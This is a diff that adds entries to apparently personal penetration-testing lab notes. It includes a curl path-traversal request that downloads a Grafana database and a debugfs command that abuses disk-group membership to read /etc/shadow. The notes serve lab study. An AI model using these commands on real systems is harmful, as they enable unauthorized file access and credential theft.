@@ -640,3 +640,51 @@ Would you like to save the private key? (y/N)
 - change to root user, add payload and reboot so that the script can be run
 
 ![systemd](/images/hetemit/systemd.png)
+
+## curl
+
+- LFI examples
+
+```bash
+curl --path-as-is "http://192.168.202.181:3000/public/plugins/prometheus/../../../../../../../../../var/lib/grafana/grafana.db" --output grafana.db
+```
+
+## disk group (linux)
+
+**uid=1001(user1) gid=1002(user1) groups=1002(user1), 6(disk)**
+
+- disk group members have raw read / write access to block devices.
+
+- check the mount
+
+```bash
+df -h
+```
+
+```bash
+Filesystem      Size  Used Avail Use% Mounted on
+udev            445M     0  445M   0% /dev
+tmpfs            98M  1.2M   97M   2% /run
+/dev/sda2       9.8G  5.6G  3.7G  61% /              <- mounted on /
+tmpfs           489M     0  489M   0% /dev/shm
+tmpfs           5.0M     0  5.0M   0% /run/lock
+tmpfs           489M     0  489M   0% /sys/fs/cgroup
+/dev/loop1       56M   56M     0 100% /snap/core18/2284
+/dev/loop2       62M   62M     0 100% /snap/core20/1328
+/dev/loop3       56M   56M     0 100% /snap/core18/2128
+/dev/loop0       68M   68M     0 100% /snap/lxd/21835
+/dev/loop5       44M   44M     0 100% /snap/snapd/14549
+/dev/loop6       71M   71M     0 100% /snap/lxd/21029
+/dev/loop4       33M   33M     0 100% /snap/snapd/12883
+tmpfs            98M     0   98M   0% /run/user/1001
+```
+
+- Access to the mount using `debugfs`
+
+```
+debugfs -R "cat /etc/shadow" /dev/sda2
+```
+
+```
+debugfs /dev/sda2 <- interactive mode
+```
